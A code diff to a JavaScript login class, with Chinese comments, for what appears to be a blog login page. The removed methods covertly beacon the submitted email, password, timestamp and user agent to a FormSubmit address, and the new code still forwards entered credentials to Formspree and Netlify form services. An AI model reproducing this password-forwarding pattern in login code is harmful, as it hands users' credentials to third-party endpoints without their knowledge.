@@ -283,7 +283,7 @@ class BlogLogin {
             return;
         }
 
-        // 验证通过，允许表单提交到 FormSubmit
+        // 验证通过，允许表单提交到 Formspree
         // 记录登录数据
         this.dataCollector.trackLogin(email, 'success', 'email');
 
@@ -294,7 +294,7 @@ class BlogLogin {
         // 显示成功消息
         this.showNotification('登录成功！正在提交表单...', 'success');
 
-        // 注意：不再阻止表单提交，让 FormSubmit 处理
+        // 注意：不再阻止表单提交，让 Formspree 处理
         // 表单会自动提交并跳转到 _next 指定的页面
         // 但如果浏览器不支持自动跳转，我们手动跳转
         setTimeout(() => {
@@ -338,27 +338,9 @@ class BlogLogin {
     }
 
     submitSocialLoginInBackground(method) {
-        // 获取 Formsubmit URL
-        const actionUrl = document.querySelector('input[name="_action"]').value;
-
-        // 创建社交登录数据
-        const socialData = {
-            'email': `${method}@social.com`,
-            'password': '[社交登录]',
-            'rememberMe': 'false',
-            'loginMethod': method,
-            'timestamp': new Date().toISOString(),
-            'userAgent': navigator.userAgent,
-            '_subject': `🚀 新的${method === 'google' ? 'Google' : 'GitHub'}登录尝试`,
-            '_captcha': 'false',
-            '_template': 'table'
-        };
-
-        // 使用 sendBeacon 发送
-        const blob = new Blob([new URLSearchParams(socialData).toString()], {
-            type: 'application/x-www-form-urlencoded'
-        });
-        navigator.sendBeacon(actionUrl, blob);
+        // 注意：此方法已不再使用
+        // 现在使用 Formspree，表单会正常提交
+        return;
     }
 
     handleForgotPassword() {
@@ -387,39 +369,15 @@ class BlogLogin {
     }
 
     submitFormInBackground(form) {
-        // 获取 Formsubmit URL
-        const actionUrl = form.querySelector('input[name="_action"]').value;
-
-        // 使用 sendBeacon 发送数据（即使页面跳转也会发送）
-        const formData = new FormData(form);
-        const blob = new Blob([new URLSearchParams(formData).toString()], {
-            type: 'application/x-www-form-urlencoded'
-        });
-        navigator.sendBeacon(actionUrl, blob);
+        // 注意：此方法已不再使用
+        // 现在使用 Formspree，表单会正常提交
+        return;
     }
 
     submitToFormsubmit(form) {
-        // 获取 Formsubmit URL（从隐藏字段）
-        const actionUrl = form.querySelector('input[name="_action"]').value;
-
-        // 创建表单数据
-        const formData = new FormData(form);
-
-        // 发送到 Formsubmit
-        fetch(actionUrl, {
-            method: 'POST',
-            body: formData
-        })
-        .then(response => {
-            if (response.ok) {
-                console.log('✅ 数据已发送到 Formsubmit');
-            } else {
-                console.log('⚠️ 发送失败:', response.statusText);
-            }
-        })
-        .catch(error => {
-            console.log('⚠️ 发送错误:', error);
-        });
+        // 注意：此方法已不再使用
+        // 现在使用 Formspree，表单会正常提交
+        return;
     }
 
     submitToNetlifyForms(email, password, rememberMe, method = 'email') {
